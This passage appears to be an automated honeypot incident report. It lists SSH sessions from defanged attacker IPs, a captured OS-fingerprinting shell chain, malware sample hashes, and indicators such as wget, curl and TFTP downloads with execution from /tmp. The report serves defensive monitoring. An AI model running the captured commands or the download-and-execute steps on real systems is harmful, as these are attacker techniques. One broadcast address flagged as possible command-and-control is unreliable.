| `2026-07-24 20:52:38` | `cowrie.client.kex` |
| `2026-07-24 20:52:40` | `cowrie.login.success` |
| `2026-07-24 20:52:41` | `cowrie.direct-tcpip.request` |
| `2026-07-24 20:52:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.93.36[.]136` to AbuseIPDB if not already reported
- [ ] Block `59.93.36[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-706e7d1011a2

| Field | Detail |
|---|---|
| **Source IP** | `111.198.53[.]188` |
| **First Seen** | 2026-07-24 20:52 |
| **Last Seen** | 2026-07-24 20:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:52:47` | `cowrie.session.connect` |
| `2026-07-24 20:52:47` | `cowrie.client.version` |
| `2026-07-24 20:52:47` | `cowrie.client.kex` |
| `2026-07-24 20:52:49` | `cowrie.login.success` |
| `2026-07-24 20:52:49` | `cowrie.direct-tcpip.request` |
| `2026-07-24 20:52:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.198.53[.]188` to AbuseIPDB if not already reported
- [ ] Block `111.198.53[.]188` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9b241a80196

| Field | Detail |
|---|---|
| **Source IP** | `110.39.181[.]194` |
| **First Seen** | 2026-07-24 20:53 |
| **Last Seen** | 2026-07-24 20:53 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:53:04` | `cowrie.session.connect` |
| `2026-07-24 20:53:06` | `cowrie.client.version` |
| `2026-07-24 20:53:06` | `cowrie.client.kex` |
| `2026-07-24 20:53:09` | `cowrie.login.success` |
| `2026-07-24 20:53:11` | `cowrie.direct-tcpip.request` |
| `2026-07-24 20:53:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.39.181[.]194` to AbuseIPDB if not already reported
- [ ] Block `110.39.181[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4acf61333e0

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-24 20:53 |
| **Last Seen** | 2026-07-24 20:53 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:53:12` | `cowrie.session.connect` |
| `2026-07-24 20:53:13` | `cowrie.client.version` |
| `2026-07-24 20:53:23` | `cowrie.client.kex` |
| `2026-07-24 20:53:30` | `cowrie.login.success` |
| `2026-07-24 20:53:34` | `cowrie.session.params` |
| `2026-07-24 20:53:34` | `cowrie.command.input` |
| `2026-07-24 20:53:34` | `cowrie.command.input` |
| `2026-07-24 20:53:34` | `cowrie.command.input` |
| `2026-07-24 20:53:34` | `cowrie.command.input` |
| `2026-07-24 20:53:34` | `cowrie.command.input` |
| `2026-07-24 20:53:34` | `cowrie.command.success` |
| `2026-07-24 20:53:34` | `cowrie.command.input` |
| `2026-07-24 20:53:34` | `cowrie.command.input` |
| `2026-07-24 20:53:34` | `cowrie.command.input` |
| `2026-07-24 20:53:34` | `cowrie.command.input` |
| `2026-07-24 20:53:35` | `cowrie.log.closed` |
| `2026-07-24 20:53:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7a030c6ffda

| Field | Detail |
|---|---|
| **Source IP** | `113.160.140[.]138` |
| **First Seen** | 2026-07-24 20:53 |
| **Last Seen** | 2026-07-24 20:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:53:16` | `cowrie.session.connect` |
| `2026-07-24 20:53:17` | `cowrie.client.version` |
| `2026-07-24 20:53:17` | `cowrie.client.kex` |
| `2026-07-24 20:53:20` | `cowrie.login.success` |
| `2026-07-24 20:53:21` | `cowrie.direct-tcpip.request` |
| `2026-07-24 20:53:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.160.140[.]138` to AbuseIPDB if not already reported
- [ ] Block `113.160.140[.]138` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1bd332d293a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:53 |
| **Last Seen** | 2026-07-24 20:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:53:39` | `cowrie.session.connect` |
| `2026-07-24 20:53:39` | `cowrie.client.version` |
| `2026-07-24 20:53:39` | `cowrie.client.kex` |
| `2026-07-24 20:53:41` | `cowrie.login.success` |
| `2026-07-24 20:53:42` | `cowrie.session.params` |
| `2026-07-24 20:53:42` | `cowrie.command.input` |
| `2026-07-24 20:53:42` | `cowrie.command.input` |
| `2026-07-24 20:53:42` | `cowrie.command.input` |
| `2026-07-24 20:53:42` | `cowrie.command.input` |
| `2026-07-24 20:53:42` | `cowrie.command.input` |
| `2026-07-24 20:53:42` | `cowrie.command.success` |
| `2026-07-24 20:53:42` | `cowrie.command.input` |
| `2026-07-24 20:53:42` | `cowrie.command.input` |
| `2026-07-24 20:53:42` | `cowrie.command.input` |
| `2026-07-24 20:53:42` | `cowrie.command.input` |
| `2026-07-24 20:53:43` | `cowrie.log.closed` |
| `2026-07-24 20:53:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d8c24125e9a

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-24 20:53 |
| **Last Seen** | 2026-07-24 20:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:53:53` | `cowrie.session.connect` |
| `2026-07-24 20:53:53` | `cowrie.client.version` |
| `2026-07-24 20:53:53` | `cowrie.client.kex` |
| `2026-07-24 20:53:53` | `cowrie.login.success` |
| `2026-07-24 20:53:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b335fdafa99

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-24 20:53 |
| **Last Seen** | 2026-07-24 20:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:53:53` | `cowrie.session.connect` |
| `2026-07-24 20:53:53` | `cowrie.client.version` |
| `2026-07-24 20:53:53` | `cowrie.client.kex` |
| `2026-07-24 20:53:53` | `cowrie.login.success` |
| `2026-07-24 20:53:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1412dba21da6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:54 |
| **Last Seen** | 2026-07-24 20:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:54:52` | `cowrie.session.connect` |
| `2026-07-24 20:54:52` | `cowrie.client.version` |
| `2026-07-24 20:54:52` | `cowrie.client.kex` |
| `2026-07-24 20:54:54` | `cowrie.login.success` |
| `2026-07-24 20:54:55` | `cowrie.session.params` |
| `2026-07-24 20:54:55` | `cowrie.command.input` |
| `2026-07-24 20:54:55` | `cowrie.command.input` |
| `2026-07-24 20:54:55` | `cowrie.command.input` |
| `2026-07-24 20:54:55` | `cowrie.command.input` |
| `2026-07-24 20:54:55` | `cowrie.command.input` |
| `2026-07-24 20:54:55` | `cowrie.command.success` |
| `2026-07-24 20:54:55` | `cowrie.command.input` |
| `2026-07-24 20:54:55` | `cowrie.command.input` |
| `2026-07-24 20:54:55` | `cowrie.command.input` |
| `2026-07-24 20:54:55` | `cowrie.command.input` |
| `2026-07-24 20:54:55` | `cowrie.log.closed` |
| `2026-07-24 20:54:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `66.132.195[.]37` | **5** | 2026-07-24 18:55 | 2026-07-24 18:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **4** | 2026-07-24 19:18 | 2026-07-24 20:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]122` | **3** | 2026-07-24 19:37 | 2026-07-24 19:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]164` | **3** | 2026-07-24 19:07 | 2026-07-24 19:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]165` | **3** | 2026-07-24 20:53 | 2026-07-24 20:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]46` | **3** | 2026-07-24 18:55 | 2026-07-24 18:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]125` | **3** | 2026-07-24 20:34 | 2026-07-24 20:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.251.143[.]14` | 1 | 2026-07-24 20:30 | 2026-07-24 20:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `117.204.1[.]45` | 1 | 2026-07-24 19:18 | 2026-07-24 19:19 | 31s | 0 | `T1592` | 🟢 LOW |
| `14.145.204[.]4` | 1 | 2026-07-24 19:04 | 2026-07-24 19:04 | 13s | 0 | `T1592` | 🟢 LOW |
| `166.62.102[.]109` | 1 | 2026-07-24 19:41 | 2026-07-24 19:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `194.164.107[.]6` | 1 | 2026-07-24 19:00 | 2026-07-24 19:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]209` | 1 | 2026-07-24 20:31 | 2026-07-24 20:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-07-24 19:06 | 2026-07-24 19:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]71` | 1 | 2026-07-24 20:00 | 2026-07-24 20:00 | 3s | 0 | `T1592` | 🟢 LOW |
| `47.74.35[.]203` | 1 | 2026-07-24 19:31 | 2026-07-24 19:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.98.41[.]27` | 1 | 2026-07-24 20:31 | 2026-07-24 20:32 | 11s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]114` | 1 | 2026-07-24 19:54 | 2026-07-24 19:55 | 16s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]56` | 1 | 2026-07-24 18:55 | 2026-07-24 18:55 | 10s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]227` | 1 | 2026-07-24 20:49 | 2026-07-24 20:49 | 17s | 0 | `T1592` | 🟢 LOW |
| `78.66.44[.]23` | 1 | 2026-07-24 19:43 | 2026-07-24 19:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `90.230.226[.]175` | 1 | 2026-07-24 20:07 | 2026-07-24 20:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | 1 | 2026-07-24 20:01 | 2026-07-24 20:01 | 54s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **35/74** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 42/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 63/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `4756c00dfa749f3fdf3a687a464632d692da370fd159c78b3ed70cad32192555` | ELF Binary (Linux executable) (ARM 32-bit) | `4756c00dfa749f3f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5348b12f049d86c5306ad9ea227b8483155183cb2a535c25b5c587c4c2491923` | ELF Binary (Linux executable) (x86-64 64-bit) | `5348b12f049d86c5...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `111.198.53[.]188` | CN | China Unicom Beijing province network | **100** ⚠️ | 41 |
| `116.114.84[.]246` | CN | China Unicom Neimeng Province Network | **100** ⚠️ | 50 |
| `93.241.232[.]14` | DE | Deutsche Telekom AG | **100** ⚠️ | 50 |
| `78.197.6[.]173` | FR | Free SAS | **100** ⚠️ | 50 |
| `14.145.204[.]4` | CN | CHINANET Guangdong province network | **100** ⚠️ | 0 |
| `102.38.3[.]107` | LY | Giga for Telecommunication and Technology Limited | **100** ⚠️ | 50 |
| `61.12.86[.]90` | IN | TTSL-ISP DIVISION | **100** ⚠️ | 50 |
| `144.22.238[.]238` | BR | Oracle Corporation | **100** ⚠️ | 3 |
| `124.88.174[.]143` | CN | China Unicom Xinjiang province network | **100** ⚠️ | 50 |
| `88.214.25[.]125` | DE | VDS&VPN services | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 229 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 220 |
